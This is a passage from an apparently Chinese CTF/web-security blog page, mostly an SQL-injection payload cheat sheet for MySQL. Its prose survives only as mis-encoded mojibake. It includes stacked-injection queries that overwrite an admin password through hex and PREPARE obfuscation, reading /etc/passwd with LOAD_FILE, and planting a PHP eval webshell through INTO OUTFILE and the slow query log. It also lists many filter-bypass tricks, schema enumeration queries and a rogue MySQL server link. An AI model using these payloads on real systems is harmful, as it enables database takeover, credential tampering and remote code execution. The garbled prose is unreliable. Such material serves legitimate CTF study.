æ³¨å…¥</h4><p>ç”±äºåˆ†å·<code>;</code>ä¸ºMYSQLè¯­å¥çš„ç»“æŸç¬¦ã€‚è‹¥åœ¨æ”¯æŒå¤šè¯­å¥æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œå¯åˆ©ç”¨æ­¤æ–¹æ³•æ‰§è¡Œå…¶ä»–æ¶æ„è¯­å¥ï¼Œå¦‚<code>RENAME</code>ã€<code>DROP</code>ç­‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;#</span><br><span class="line">1;show tables;#</span><br><span class="line">1;show columns from [è¡¨å];#</span><br><span class="line"></span><br><span class="line">1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e)</span><br><span class="line"></span><br><span class="line">/*é¢„å¤„ç†*/</span><br><span class="line">1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;#</span><br><span class="line">1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;#</span><br><span class="line"></span><br><span class="line">1&#x27;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br><span class="line">1&#x27;;SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure><h4 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h4><p>æ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚</p><blockquote><p>ç°åœ¨é€šå¸¸Webåº”ç”¨ç¨‹åºå¤§å¤šéƒ½ä¼šè¿›è¡Œå‚æ•°è¿‡æ»¤ï¼Œæ¥é˜²æ­¢æ³¨å…¥ã€‚å¦‚æœæŸå¤„ä½¿ç”¨äº†urldecode()æˆ–è€… rawurldecode()å‡½æ•°ï¼Œåˆ™ä¼šå¯¼è‡´äºŒæ¬¡è§£ç ç”Ÿæˆå•å¼•å·äºŒå¼•å‘æ³¨å…¥ï¼Œå³äºŒæ¬¡æ³¨å…¥ã€‚</p><p>Webåº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨addslashes() ã€mysql_real_escape_string()ã€mysql_escape_string()å‡½æ•°æˆ–è€…å¼€å¯GPCæ¥é˜²æ­¢æ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯ç»™å•å¼•å·(â€˜â€™)ã€åŒå¼•å·(â€œâ€)ã€åæ–œæ ()å’ŒNULLåŠ ä¸Šåæ–œæ è½¬ä¹‰ã€‚</p><p>addslasheså‡½æ•°è™½ç„¶åœ¨è¿‡æ»¤ä¹‹åä¼šæ·»åŠ  â€œ\â€ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯ â€œ\â€ å¹¶ä¸ä¼šè¢«å¸¦åˆ°æ•°æ®åº“ä¸­</p></blockquote><ul><li><h5 id="äºŒæ¬¡urldecodeæ³¨å…¥"><a href="#äºŒæ¬¡urldecodeæ³¨å…¥" class="headerlink" title="äºŒæ¬¡urldecodeæ³¨å…¥"></a>äºŒæ¬¡urldecodeæ³¨å…¥</h5><p>å•å¼•å·ï¼š<code>%25%27</code></p><p>åŒå¼•å·ï¼š<code>%25%22</code></p></li></ul><h4 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h4><p><strong>è¯»æ–‡ä»¶</strong></p><p><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;)</code></p><p><code>SELECT LOAD_FILE(0x2f666c6167)</code></p><p><strong>å†™æ–‡ä»¶</strong></p><p><code>SELECT &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/phpinfo.php&#39;</code></p><p><code>select version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x16è¿›åˆ¶æ–‡ä»¶</code></p><p><strong>æ…¢æŸ¥è¯¢æ³¨å…¥</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file=&#x27;/var/www/html/shell.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_GET[a])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure><p>â€‹</p><h4 id="Rogue-Mysql-Server"><a href="#Rogue-Mysql-Server" class="headerlink" title="Rogue Mysql Server"></a>Rogue Mysql Server</h4><p>æ­å»ºæ¶æ„mysqlæœåŠ¡å™¨è¯»å–æ–‡ä»¶ã€‚</p><p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><p>â€‹</p><h4 id="Quine"><a href="#Quine" class="headerlink" title="Quine"></a>Quine</h4><p>Quineåˆå«åšè‡ªäº§ç”Ÿç¨‹åºï¼Œåœ¨sqlæ³¨å…¥æŠ€æœ¯ä¸­ï¼Œè¿™æ˜¯ä¸€ç§ä½¿å¾—è¾“å…¥çš„sqlè¯­å¥å’Œè¾“å‡ºçš„sqlè¯­å¥ä¸€è‡´çš„æŠ€æœ¯ï¼Œå¸¸ç”¨äºä¸€äº›ç‰¹æ®Šçš„ç™»é™†ç»•è¿‡sqlæ³¨å…¥ä¸­ã€‚</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570">ä»ä¸‰é“èµ›é¢˜å†è°ˆQuine trick</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">37</span>),&quot;%&quot;)))#<span class="string">&#x27;)))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- CHAR =&gt; 0x</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ç»•è¿‡ï¼ˆbypassï¼‰"><a href="#ç»•è¿‡ï¼ˆbypassï¼‰" class="headerlink" title="ç»•è¿‡ï¼ˆbypassï¼‰"></a>ç»•è¿‡ï¼ˆbypassï¼‰</h3><h4 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h4><ol><li>å¤šå±‚æ‹¬å·åµŒå¥—</li><li>æ”¹ç”¨+å·</li><li>ä½¿ç”¨æ³¨é‡Šä»£æ›¿ï¼ˆ/*æ³¨é‡Šå†…å®¹*/ã€/*! MYSQLä¸“å±*/ï¼‰</li><li><code>and/or</code>åé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª<code>!ã€~</code>å¯ä»¥æ›¿ä»£ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ··åˆä½¿ç”¨(è§„å¾‹åˆä¸åŒ)ï¼Œand/orå‰çš„ç©ºæ ¼å¯ç”¨çœç•¥</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code>ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼</li></ol><h4 id="å•åŒå¼•å·"><a href="#å•åŒå¼•å·" class="headerlink" title="å•åŒå¼•å·"></a>å•åŒå¼•å·</h4><ol><li>éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå°è¯•æ˜¯å¦å­˜åœ¨ç¼–ç é—®é¢˜è€Œäº§ç”Ÿçš„SQLæ³¨å…¥ã€‚</li><li>ä¸éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå­—ç¬¦ä¸²å¯ç”¨<strong>16è¿›åˆ¶</strong>è¡¨ç¤ºã€ä¹Ÿå¯é€šè¿‡è¿›åˆ¶è½¬æ¢å‡½æ•°è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶ã€‚</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- hex ç¼–ç </span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="number">0x61646D696E</span></span><br><span class="line"><span class="comment">-- char() å‡½æ•°</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="type">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)</span><br></pre></td></tr></table></figure><h4 id="é€—å·"><a href="#é€—å·" class="headerlink" title="é€—å·"></a>é€—å·</h4><ol><li>é‡‡ç”¨ <code>substr((database())from(&#123;&#125;)for(1))</code> çš„å½¢å¼</li><li>é‡‡ç”¨joinï¼š<code>union select * from ((select 1)a join (select 2)b join (select 3)c);</code></li></ol><h4 id="ç­‰å·"><a href="#ç­‰å·" class="headerlink" title="ç­‰å·"></a>ç­‰å·</h4><ol><li><code>like</code></li><li>ç”¨<code>regexp</code>æˆ–è€…<code>in</code></li><li><code>&lt;&gt;</code></li></ol><h4 id="åˆ†å·"><a href="#åˆ†å·" class="headerlink" title="åˆ†å·"></a>åˆ†å·</h4><ol><li>æ¢è¡Œ <code>%0a</code></li><li>æ”¹å˜è¾“å…¥ç»“æŸç¬¦ï¼š<code>delimiter</code></li></ol><h4 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h4><ol><li>åŒå†™<code>ananddã€oorr</code></li><li>ä½¿ç”¨è¿ç®—ç¬¦ä»£æ›¿<code>&amp;&amp;ã€||</code></li><li>ç›´æ¥æ‹¼æ¥<code>=</code>å·ï¼Œå¦‚ï¼š<code>?id=1=(condition)</code></li><li>å…¶ä»–æ–¹æ³•ï¼Œå¦‚ï¼š<code>?id=1^(condition)</code>ã€<code>?id=1)xor(condition)</code></li><li>æ— æ³•ä½¿ç”¨ <code>information</code>ã€<code>performance</code>ï¼š<code>mysql.innodb_table_stats</code> æŸ¥è¡¨å</li></ol><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><ol><li>ç›²æ³¨ï¼š<code>&#39;and(select pass from users limit 1)=&#39;secret</code></li></ol><h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><ol><li><p>æœ‰æ–‡ä»¶è¯»å–æƒé™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and substr(load_file(&#x27;</span>file<span class="string">&#x27;),locate(&#x27;</span>DocumentRoot<span class="string">&#x27;,(load_file(&#x27;</span>file<span class="string">&#x27;)))+</span></span><br><span class="line"><span class="string">length(&#x27;</span>DocumentRoot<span class="string">&#x27;),10)=&#x27;</span>a<span class="string">&#x27;=&#x27;&#x27; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>dump.txt</span><br></pre></td></tr></table></figure></li><li><p>è·å–åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and åˆ—å is not null#</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">procedure</span> analyse()#</span><br><span class="line"><span class="string">&#x27;and substr(pass,1,1)=&#x27;</span>a  <span class="comment">/*ä½¿ç”¨substræ¥åšè¿‡æ»¤æ¡ä»¶*/</span></span><br></pre></td></tr></table></figure></li><li><p>handlerè¯­å¥ä»£æ›¿selectæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*é€šè¿‡handlerè¯­å¥æŸ¥è¯¢usersè¡¨çš„å†…å®¹*/</span></span><br><span class="line">handler users <span class="keyword">open</span> <span class="keyword">as</span> yunensec; <span class="comment">/*æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½å*/</span></span><br><span class="line">handler yunensec read <span class="keyword">first</span>; <span class="comment">/*è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„é¦–è¡Œæ•°æ®*/</span></span><br><span class="line">handler yunensec read next; <span class="comment">/*è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®*/</span></span><br><span class="line">handler yunensec read next; <span class="comment">/*è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®*/</span></span><br><span class="line">...</span><br><span class="line">handler yunensec <span class="keyword">close</span>; <span class="comment">/*å…³é—­å¥æŸ„*/</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select pass from users where id=1)=&#x27;</span>a</span><br><span class="line"><span class="string">&#x27;and(select pass from users group by id having id=1)=&#x27;</span>a</span><br><span class="line"><span class="string">&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;</span>a<span class="string">&#x27;))</span></span><br></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><ol><li><code>join/left join/right join...on...</code></li></ol><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><ol><li>æ›¿ä»£è¡¨ï¼š<code>sys.x$schema_flattened_keys</code> ã€<code>sys.schema_table_statistics</code></li></ol><h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h4><ol><li><code>ascii()</code> =&gt; <code>ord()</code></li></ol><h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><ol><li><code>substr()</code> =&gt; <code>mid()</code></li><li><code>left()</code> / <code>right()</code></li></ol><h4 id="as"><a href="#as" class="headerlink" title="as"></a>as</h4><ol><li><code>database()</code> =&gt; <code>schema()</code></li></ol><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><ol><li><code>case when</code></li></ol><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><ol><li><code>group by</code></li></ol><h4 id="å…¶ä»–å…³é”®å­—"><a href="#å…¶ä»–å…³é”®å­—" class="headerlink" title="å…¶ä»–å…³é”®å­—"></a>å…¶ä»–å…³é”®å­—</h4><ol><li><p>å¤§å°å†™ç»•è¿‡</p></li><li><p>åŒå†™ç»•è¿‡</p><ol><li><p>ä½¿ç”¨åŒä¹‰å‡½æ•°/è¯­å¥ä»£æ›¿ï¼Œå¦‚ifå‡½æ•°å¯ç”¨<code>case when condition then 1 else 0 end</code>è¯­å¥ä»£æ›¿ã€‚</p></li><li><p>ä½¿ç”¨ <code>CONCAT()</code> æ—¶ï¼Œä»»ä½•ä¸ªå‚æ•°ä¸º nullï¼Œå°†è¿”å› nullï¼Œæ¨èä½¿ç”¨ <code>CONCAT_WS()</code>ã€‚<code>CONCAT_WS()</code>å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºç”¨å“ªä¸ªå­—ç¬¦é—´éš”æ‰€æŸ¥è¯¢çš„ç»“æœã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;d&#x27;</span> <span class="string">&#x27;mi&#x27;</span> <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> CONCAT(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> CONCAT_WS(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="æ‹¬å·"><a href="#æ‹¬å·" class="headerlink" title="æ‹¬å·"></a>æ‹¬å·</h4><ol><li>order by å¤§å°æ¯”è¾ƒç›²æ³¨</li></ol><h4 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h4><ol><li><p>ç”¨<code>true</code>æ¢<code>1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x</span>):</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">&#x27;(&#x27;</span>+<span class="string">&#x27;(true)+&#x27;</span>*x)[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>æ›¿æ¢è¡¨</p></li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">ä»£æ›¿å­—ç¬¦</th><th style="text-align:center">æ•°</th><th style="text-align:center">ä»£æ›¿å­—ç¬¦</th><th style="text-align:center">æ•°</th><th style="text-align:center">ä»£æ›¿å­—ç¬¦</th><th style="text-align:center">æ•°</th><th style="text-align:center">æ•°</th><th style="text-align:center">ä»£æ›¿å­—ç¬¦</th></tr></thead><tbody><tr><td style="text-align:center">falseã€!pi()</td><td style="text-align:center">0</td><td style="text-align:center">ceil(pi()*pi())</td><td style="text-align:center">10</td><td style="text-align:center">A</td><td style="text-align:center">ceil((pi()+pi())*pi())</td><td style="text-align:center">20</td><td style="text-align:center">K</td></tr><tr><td style="text-align:center">trueã€!(!pi())</td><td style="text-align:center">1</td><td style="text-align:center">ceil(pi()*pi())+true</td><td style="text-align:center">11</td><td style="text-align:center">B</td><td style="text-align:center">ceil(ceil(pi())*version())</td><td style="text-align:center">21</td><td style="text-align:center">L</td></tr><tr><td style="text-align:center">true+true</td><td style="text-align:center">2</td><td style="text-align:center">ceil(pi()+pi()+version())</td><td style="text-align:center">12</td><td style="text-align:center">C</td><td style="text-align:center">ceil(pi()*ceil(pi()+pi()))</td><td style="text-align:center">22</td><td style="text-align:center">M</td></tr><tr><td style="text-align:center">floor(pi())ã€~~pi()</td><td style="text-align:center">3</td><td style="text-align:center">floor(pi()*pi()+pi())</td><td style="text-align:center">13</td><td style="text-align:center">D</td><td style="text-align:center">ceil((pi()+ceil(pi()))*pi())</td><td style="text-align:center">23</td><td style="text-align:center">N</td></tr><tr><td style="text-align:center">ceil(pi())</td><td style="text-align:center">4</td><td style="text-align:center">ceil(pi()*pi()+pi())</td><td style="text-align:center">14</td><td style="text-align:center">E</td><td style="text-align:center">ceil(pi())*ceil(version())</td><td style="text-align:center">24</td><td style="text-align:center">O</td></tr><tr><td style="text-align:center">floor(version()) //æ³¨æ„ç‰ˆæœ¬</td><td style="text-align:center">5</td><td style="text-align:center">ceil(pi()*pi()+version())</td><td style="text-align:center">15</td><td style="text-align:center">F</td><td style="text-align:center">floor(pi()*(version()+pi()))</td><td style="text-align:center">25</td><td style="text-align:center">P</td></tr><tr><td style="text-align:center">ceil(version())</td><td style="text-align:center">6</td><td style="text-align:center">floor(pi()*version())</td><td style="text-align:center">16</td><td style="text-align:center">G</td><td style="text-align:center">floor(version()*version())</td><td style="text-align:center">26</td><td style="text-align:center">Q</td></tr><tr><td style="text-align:center">ceil(pi()+pi())</td><td style="text-align:center">7</td><td style="text-align:center">ceil(pi()*version())</td><td style="text-align:center">17</td><td style="text-align:center">H</td><td style="text-align:center">ceil(version()*version())</td><td style="text-align:center">27</td><td style="text-align:center">R</td></tr><tr><td style="text-align:center">floor(version()+pi())</td><td style="text-align:center">8</td><td style="text-align:center">ceil(pi()*version())+true</td><td style="text-align:center">18</td><td style="text-align:center">I</td><td style="text-align:center">ceil(pi()*pi()*pi()-pi())</td><td style="text-align:center">28</td><td style="text-align:center">S</td></tr><tr><td style="text-align:center">floor(pi()*pi())</td><td style="text-align:center">9</td><td style="text-align:center">floor((pi()+pi())*pi())</td><td style="text-align:center">19</td><td style="text-align:center">J</td><td style="text-align:center">floor(pi()*pi()*floor(pi()))</td><td style="text-align:center">29</td><td style="text-align:center">T</td></tr></tbody></table></div><h4 id="mysqlç³»ç»Ÿåº“"><a href="#mysqlç³»ç»Ÿåº“" class="headerlink" title="mysqlç³»ç»Ÿåº“"></a>mysqlç³»ç»Ÿåº“</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥è¯¢æ‰€æœ‰éç³»ç»Ÿè‡ªå¸¦æ•°æ®åº“ã€è¡¨ã€åˆ—</span><br><span class="line">select table_schema,table_name,column_name from information_schema.columns where table_schema not in (&#x27;sys&#x27;,&#x27;mysql&#x27;,&#x27;information_schema&#x27;,&#x27;performance_schema&#x27;)</span><br><span class="line"></span><br><span class="line">#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨</span><br><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()</span><br><span class="line">select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()</span><br></pre></td></tr></table></figure><h4 id="sysç³»ç»Ÿåº“"><a href="#sysç³»ç»Ÿåº“" class="headerlink" title="sysç³»ç»Ÿåº“"></a>sysç³»ç»Ÿåº“</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥è¯¢æ‰€æœ‰çš„åº“ï¼š</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line"></span><br><span class="line">#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨ï¼ˆè‹¥æ— åˆ™è¯´æ˜æ­¤è¡¨ä»æœªè¢«è®¿é—®ï¼‰ï¼š</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line"></span><br><span class="line">#ç»Ÿè®¡æ‰€æœ‰è®¿é—®è¿‡çš„è¡¨æ¬¡æ•°:åº“å,è¡¨å,è®¿é—®æ¬¡æ•°</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿æ¥çš„ç”¨æˆ·è¯¦ç»†ä¿¡æ¯:è¿æ¥çš„ç”¨æˆ·(è¿æ¥çš„ç”¨æˆ·å,è¿æ¥çš„ip),å½“å‰åº“,ç”¨æˆ·çŠ¶æ€(Sleepå°±æ˜¯ç©ºé—²),ç°åœ¨åœ¨æ‰§è¡Œçš„sqlè¯­å¥,ä¸Šä¸€æ¬¡æ‰§è¡Œçš„sqlè¯­å¥,å·²ç»å»ºç«‹è¿æ¥çš„æ—¶é—´(ç§’)</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æ‰€æœ‰æ›¾è¿æ¥æ•°æ®åº“çš„IP,æ€»è¿æ¥æ¬¡æ•°</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è¯­å¥çš„æ‰§è¡Œè®°å½•</span><br><span class="line">SELECT * from sys.x$statement_analysis;</span><br></pre></td></tr></table></figure><h4 id="æ— åˆ—åæ³¨å…¥ï¼ˆor-column-è¢«è¿‡æ»¤ï¼‰"><a href="#æ— åˆ—åæ³¨å…¥ï¼ˆor-column-è¢«è¿‡æ»¤ï¼‰" class="headerlink" title="æ— åˆ—åæ³¨å…¥ï¼ˆor / column è¢«è¿‡æ»¤ï¼‰"></a>æ— åˆ—åæ³¨å…¥ï¼ˆor / column è¢«è¿‡æ»¤ï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(`2`) from (select 1,2,3 union select * from user)x;</span><br><span class="line">select `2` from (select 1,2,3 union select * from user)x limit 1,1;</span><br><span class="line">select ((select 1,&#x27;ae&#x27;,0)&gt;(select * from user));</span><br><span class="line">union all select * from (select * from users as a join users b using(id,username))c--+</span><br><span class="line">extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))#</span><br></pre></td></tr></table></figure><h4 id="åŒæ­¥è¡¨æ•°æ®-ä¸»ä»å¤åˆ¶"><a href="#åŒæ­¥è¡¨æ•°æ®-ä¸»ä»å¤åˆ¶" class="headerlink" title="åŒæ­¥è¡¨æ•°æ® - ä¸»ä»å¤åˆ¶"></a>åŒæ­¥è¡¨æ•°æ® - ä¸»ä»å¤åˆ¶</h4><p>æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ï¼š<code>select version();</code></p><p>åœ¨è‡ªå·±vpsä¸Šèµ·ä¸€ä¸ªç›¸åŒç‰ˆæœ¬çš„mariadbï¼Œä¿®æ”¹é»˜è®¤é…ç½®æ–‡ä»¶ <code>vim /etc/mysql/my.cnf</code> å…è®¸è¿œç¨‹è®¿é—®å¹¶å¯</p><p>ç”¨äºŒè¿›åˆ¶æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server-id = 1</span><br><span class="line">log_bin = /var/log/mysql/mariadb-bin</span><br></pre></td></tr></table></figure><p><code>service mysql 